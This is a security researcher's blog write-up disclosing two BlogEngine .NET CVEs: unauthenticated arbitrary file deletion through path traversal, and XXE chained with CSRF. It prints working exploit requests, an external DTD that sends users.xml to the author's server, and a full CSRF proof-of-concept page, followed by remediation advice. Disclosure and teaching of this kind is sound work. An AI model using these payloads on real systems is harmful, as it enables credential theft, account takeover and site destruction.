---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-19_write-up-blogengine-net-0day-discovery.md
original_filename: 2022-07-19_write-up-blogengine-net-0day-discovery.md
title: 'Write-up: BlogEngine .NET - 0day Discovery'
category: blogs
detected_topics:
- command-injection
- path-traversal
- csrf
- sso
- access-control
- ssrf
tags:
- imported
- blogs
- command-injection
- path-traversal
- csrf
- sso
- access-control
- ssrf
language: en
raw_sha256: 89830545a42bb5b17416f174f31b6c21330d2b8589fcec99c414387701074452
text_sha256: 2554a829e51c4c04206c5d9d4c3402407a4ee58857dee076ca19dfcbf319cf15
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Write-up: BlogEngine .NET - 0day Discovery

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-19_write-up-blogengine-net-0day-discovery.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, csrf, sso, access-control, ssrf
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `89830545a42bb5b17416f174f31b6c21330d2b8589fcec99c414387701074452`
- Text SHA256: `2554a829e51c4c04206c5d9d4c3402407a4ee58857dee076ca19dfcbf319cf15`


## Content

---
title: "Write-up: BlogEngine .NET - 0day Discovery"
page_title: "Write-up: BlogEngine .NET - Bug Discovery"
url: "https://www.0xlanks.me/blog/blogengine-writeup"
final_url: "https://www.0xlanks.me/blog/blogengine-writeup/"
authors: ["Jake McCallum (@0xLanks)", "Ethan (@complex201)"]
programs: ["BlogEngine .NET"]
bugs: ["Path traversal", "XXE"]
publication_date: "2022-07-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2425
---

July 19, 2022

# Write-up: BlogEngine .NET - Bug Discovery

![Write-up: BlogEngine .NET - Bug Discovery](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/size/w1100/2022/07/MrTall_Morpheus3-1.png)

* * *

## [**Unauthenticated Arbitrary File Deletion (CVE-2022-25591)**](https://www.0xlanks.me/blog/cve-2022-25591-advisory/)

* * *

## **Introduction**

One of the first things I try to understand when auditing a new code base, is how the developers have implemented authentication and authorisation controls, and whether or not they're effective. Depending on the complexity of the application, this can sometimes be a monotonous task. The results dovetail nicely however, with the next task of understanding what application routes can be accessed from an unauthenticated standpoint. This is where I spend the majority of my time, as any sensitive functionality that can be accessed without having logged into the application, has the potential to be a critical issue. 

## **Code Analysis**

After having a quick browse of the application structure, I noticed that it had been developed with an MVC repository design pattern. The purpose of this specific pattern is to create a layer of abstraction between the database and business logic layers. So instead of having all data interactions done from within the controller, the repository layer will instead conduct CRUD operations with the data-access layer. The main advantage of this is to isolate data-access logic from business logic, allowing for increased scalability. It also allows for the centralisation of database interactions, so code readability is increased;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/custom-repo-versus-db-context-1024x579.webp)

While auditing the authorisation workflow for BlogEngine, I found that in some instances, authorisation checks would be done within the controller actions;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/05/Security_Action.png)

While other times they would be conducted within the repository;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/Repository.png)

which was then invoked from the controller action;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/Controller.png)

While this isn't a security issue, it does mean that there are two potential areas to check (and subsequently forget) authorisation controls.

As I continued to audit the application, I came across the following action within the _FileManager_ controller;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/image-1.png)

This allows an administrator to delete files and folders that have been uploaded to a particular directory and is only meant to be accessed from an authenticated standpoint.

Notice anything odd though?

Nowhere within the action does it check to see if the user is an administrator, nor does it invoke the _FileManager_ repository. Therefore, anyone interacting with the application is able to access this route, unauthenticated. 

As it stands, this issue grants an unauthenticated user the ability to delete files or directories within the applications _App_Data/files/_ directory structure. However, we want to understand how critical this issue actually is, so further analysis is necessary.

Stepping through the _BlogService.DeleteFile_ method within the _ProcessChecked_ controller action above, we can see that it takes one argument which is the full path of the file we are trying to delete. As this variable is user controlled, if there are no checks in place to ensure files outside of the intended folder structure cannot be deleted, then a simple directory traversal (../) could be used to delete core application files within the web root, such as the Web.Config. 

Debugging the method within [dnSpy](https://github.com/dnSpy/dnSpy?ref=0xlanks.me), we can see that the final method called before the file is deleted, is the _BlogAbsolutePath_ method which maps the virtual path provided to a physical path on disk;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image.png)

As suspected, no business logic or sanitisation checks are conducted, which ultimately allows us to delete any application specific file.

Sending the following web request to any vulnerable application will result in a complete Denial of Service condition;
  
  
  PUT /api/filemanager/processchecked/delete HTTP/1.1
  Host: blogengine
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
  Accept: application/json, text/plain, */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json;charset=utf-8
  Content-Length: 85
  Origin: http://blogengine
  Connection: close
  Referer: http://blogengine/admin/app/editor/filemanager.cshtml
  
  [{"IsChecked":true,"Name":"Web.Config","FileType":1,"FullPath":"/../../Web.Config",}]

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-1.png)

Despite the criticality of this issue, there is a slight caveat. The vulnerability is completely dependant on the permission level the IIS web server is using to run the application. As such, the only way we can tell if the application is vulnerable under normal circumstances, is attempt to exploit it. 

However, further code analysis revealed an API call __ that made exploit validation safer. This functionality, when queried, will attempt to create a temporary file within the webroot, delete it, and then return to the user whether it was successful or not. It also returns the full file path for the application (definitely not ideal). The screenshot below shows a vulnerable, internet exposed, BlogEngine instance;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/tempsnip.png)

If the above success message is returned, the application has write and delete permissions within the webroot and is vulnerable to unauthenticated arbitrary file deletion.

## **Solution**

Trawling through Stack Overflow (as you do) I came across this response to the thread [Pattern for doing authorization in repository layer of MVC application](https://stackoverflow.com/questions/14901540/pattern-for-doing-authorization-in-repository-layer-of-mvc-application?ref=0xlanks.me), which I ultimately think is the correct one;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/image.png)

In addition, the developers could look to implement authorisation attributes. This can be done either globally within a controller, or granularly within specific actions;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-5.png)

The following code snippet limits access to the _Security_ controller to those who have been assigned the Administrator role. This greatly increases code readability and scalability.

Furthermore, sanitisation to prevent directory traversal issues should be implemented on all path variables. PortSwigger have a solid implementation strategy when providing user supplied input to filesystem API's in a code base. You can find it [here](https://portswigger.net/web-security/file-path-traversal?ref=0xlanks.me).

* * *

## [XML External Entity Injection & Cross-Site Request Forgery (CVE-2022-28921)](https://www.0xlanks.me/blog/cve-2022-28921-advisory/)

* * *

## **Introduction**

Before I even start hunting for bugs in an application code base, I always look to see what past vulnerabilities have been identified. Occasionally, the search reveals trends in classes of vulnerabilities that developers have had issues with in the past. 

These trends usually mean one of two things:  
  
1) The developer(s) have learnt to identify how the particular class of vulnerability manifests within their code base and have remediated all instances of it.

2) The developer(s) spot fix raised issues and never fix the core, underlying issue.

In my experience, the latter is often true. 

In the case of BlogEngine, there seemed to be a common theme around the applications processing of XML data, resulting in several instances of XML External Entity (XXE) injection;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/tempsnip-1.png)

[XXE injection](https://portswigger.net/web-security/xxe?ref=0xlanks.me) is a type of attack against a web application that utilises XML data. The vulnerability arises when XML input containing a reference to an [external entity](https://docs.microsoft.com/en-us/dotnet/standard/data/xml/reading-entity-declarations-and-entity-references-into-the-dom?ref=0xlanks.me) is processed by an insecure XML parser. Security impacts of this type of attack could include the disclosure of confidential files, Denial of Service (DoS) conditions, Server Side Request Forgery (SSRF) or in some circumstances, Remote Code Execution (RCE).

## **Code Analysis**

I was pretty curious as to why these XXE issues kept arising. Browsing to the Web.Config file, I quickly found the answer;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/tempsnipxxe.png)

.Net Framework versions prior to 4.5.2 have insecure defaults in certain XML parsers. Meaning, their default action when handling [Document Type Definitions](https://en.wikipedia.org/wiki/Document_type_definition?ref=0xlanks.me) (DTD) is to process them, not block them. DTDs describe the structure and syntax of compliant XML documents while specifying the content and values allowed.

Armed with this knowledge, I started looking through the code base for any instances of XML input.

After assessing the application for a while, I came across the _UploadController_. This particular method peaked my interest;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-12.png)

Which was invoked from the controller;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/tempsnipblah.png)

Within the _ImportBlogML()_ method, we can see the _blogReader_ object takes XML data from an uploaded file that we control, converts it into a data stream and invokes the _Import()_ method on it. This method can be seen below;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-15.png)

Within the _Import()_ method, we can see that the _BlogMLSerializer.Deserialize()_ method is invoked which takes one argument of an _XmlReader_ object. This is where the vulnerability lies.

Using dnSpy to identify the settings associated with the object, we can see that _DtdProcessing_ is set to "Parse";

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/DtdProcessing-1.png)

In .Net this setting allows all external entities to be interpreted, which unfortunately introduces an XXE vulnerability.

As a proof of concept, the following HTTP request was sent to a test environment implementation of BlogEngine;
  
  
  POST /api/upload?action=import HTTP/1.1
  Host: blogengine
  Content-Length: 298
  Accept: application/json, text/plain, */*
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
  x-blog-instance: 96d5b379-7e1d-4dac-a6ba-1e50db561b04
  Referer: http://blogengine/admin/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
  Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=[Removed for Brevity]
  Connection: close
  
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="file"; filename="BlogML.xml"
  Content-Type: text/xml
  
  <?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://13.211.x.x/"> %xxe; ]>
  
  ------WebKitFormBoundaryMSYnZ4tJmbf4nEFB--

This request resulted in a call-back to my internet hosted server, indicating that this particular upload functionality was vulnerable. As the server throws an internal server error when the request is issued, normal in-band data exfiltration techniques won't work. However, other [out-of-band](https://portswigger.net/web-security/xxe/blind?ref=0xlanks.me) methods are available.

Modifying the previous HTTP request to the following;

**_HTTP Request_**
  
  
  POST /api/upload?action=import HTTP/1.1
  Host: blogengine
  Content-Length: 311
  Accept: application/json, text/plain, */*
  Content-Type: multipart/form-data; boundary=----***REDACTED-SUSPECT-TOKEN***  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
  x-blog-instance: 96d5b379-7e1d-4dac-a6ba-1e50db561b04
  Referer: http://blogengine/admin/
  Accept-Encoding: gzip, deflate
  Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
  Cookie: .AUXBLOGENGINE-96d5b379-7e1d-4dac-a6ba-1e50db561b04=[Removed for Brevity]
  Connection: close
  
  ------***REDACTED-SUSPECT-TOKEN***  Content-Disposition: form-data; name="file"; filename="BlogML.xml"
  Content-Type: text/xml
  
  <?xml version="1.0" ?>
  <!DOCTYPE random [
  <!ENTITY % xxe SYSTEM "http://13.211.x.x/test.dtd">
  %xxe;
  %param1;
  %exfil;
  ]>
  
  ------WebKitFormBoundaryMSYnZ4tJmbf4nEFB--

and utilising the following external DTD, hosted on an internet web server;

**_External DTD_**
  
  
  <!ENTITY % data SYSTEM "file:///C:/inetpub/wwwroot/BlogEngine/App_data/users.xml">
  
  <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://13.211.x.x/?%data;'>">

I was able to successfully leak the users.xml file which houses all associated usernames and hashed passwords for the BlogEngine application;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-18.png)

Once URL decoded, we can see the contents of the file;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-19.png)

Located within the _BlogEngine.Core.Utils_ class, we can see how the passwords are being hashed;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-20.png)

As the hashing method utilises SHA256, we can convert the base64'd password string into its corresponding Hex value, and then attempt to crack it;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-21.png)![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/161039367-71ec1f05-fd0a-455a-aac3-c3a2f144454e.png)

While this does result in a complete account takeover, the XXE vulnerability can only be triggered from an authenticated standpoint. Meaning, account takeover is effectively useless if we already have the ability to login to the application. Therefore, we need to find a way to exploit the vulnerability, unauthenticated. Enter, Cross-Site Request Forgery (CSRF).

[CSRF](https://portswigger.net/web-security/csrf?ref=0xlanks.me) is an attack that forces a user to execute unwanted actions on a web application in which they’re currently authenticated. With a little help of social engineering, an attacker can trick users of a web application into executing actions of their choosing.

_Side-note: If you think CSRF issues are lame because they require user interaction AND a valid session when the link is clicked, I agree with you. But it definitely increases the severity rating if it can be chained with a vulnerability that is state changing or leaks sensitive information. i.e. an XXE._

Throughout the code audit, I didn't see any indication of CSRF tokens or SameSite cookie attributes that would indicate the application was protected from such an attack. By generating a CSRF proof of concept, we can now demonstrate how an administrator visiting an attacker controlled webpage could inadvertently reveal the administrator password. The following code is hosted on an attacker site;
  
  
  <html>
  <body>
  <h1>CSRF to XXE Proof of Concept</h1>
  <script>history.pushState('', '', '/')</script>
  <script>
  function submitRequest()
  {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "http:\/\/blogengine\/api\/upload?action=import", true);
  xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------340619855020781474872767869931");
  xhr.withCredentials = true;
  var body = "-----------------------------340619855020781474872767869931\r\n" + 
  "Content-Disposition: form-data; name=\"file\"; filename=\"BlogML.xml\"\r\n" + 
  "Content-Type: text/xml\r\n" + 
  "\r\n" + 
  "\x3c?xml version=\"1.0\" ?\x3e\r\n" + 
  "\x3c!DOCTYPE r [\r\n" + 
  "\x3c!ELEMENT r ANY \x3e\r\n" + 
  "\x3c!ENTITY % sp SYSTEM \"http://13.211.x.x/test.dtd\"\x3e\r\n" + 
  "%sp;\r\n" + 
  "%param1;\r\n" + 
  "%exfil;\r\n" + 
  "]\x3e\r\n" + 
  "\r\n" + 
  "-----------------------------340619855020781474872767869931--\r\n";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
  }
  </script>
  <form action="#">
  <input type="button" value="Submit request" onclick="submitRequest();" />
  </form>
  </body>
  </html>

And would look like the following when rendered in a browser;

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/image-22.png)

Once clicked, the XXE attack is initiated and the administrator hash is leaked. The proof of concept displayed requires a button to be clicked to launch the attack, however with modification to the embedded JavaScript this can be conducted _onload_ when the webpage is rendered, with no additional user interaction required.

To the astute reader, you would probably be asking "_In your test.dtd file, you've hardcoded a path on disk of a known location. How would an attacker know the exact path to the users.xml file if they're targeting a real-world application? Is this attack even feasible?_ ".

Remember the API call within the arbitrary file delete vulnerability, that showed if the application could write and delete files to the webroot? The one that shows the full file path of the application?

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/07/tempsnip-2.png)

Simply remove tmp.txt, append /App_Data/users.xml to the file path and you have your location on disk.

This demonstrates how a seemingly insignificant information disclosure can be chained with additional vulnerabilities for maximum effect.

## **Solution**

Whenever dealing with XML, it's important to understand the attack vectors available for the particular framework you're using. Some XML parsers are secure by default, others are not. As BlogEngine is a rather old application, upgrading it to a newer version of the .NET Framework would have fixed the majority of the XXE vulnerabilities as XML parser settings have been updated to set the _XmlResolver_ attribute to _null_ , disallowing external entities to be parsed. 

To remediate CSRF issues, it's generally advised to use a synchroniser token pattern and a SameSite cookie attribute as part of a solid defence in depth strategy. When in doubt though, I always refer back to the awesome [cheat sheet series](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html?ref=0xlanks.me) by OWASP to determine the best mitigation strategies for the particular development framework being used.

![](https://storage.ghost.io/c/2f/8f/2f8f8f3b-cc89-4b7b-be33-33d5df2dcd5b/content/images/2022/06/1500x500-1.jpg)
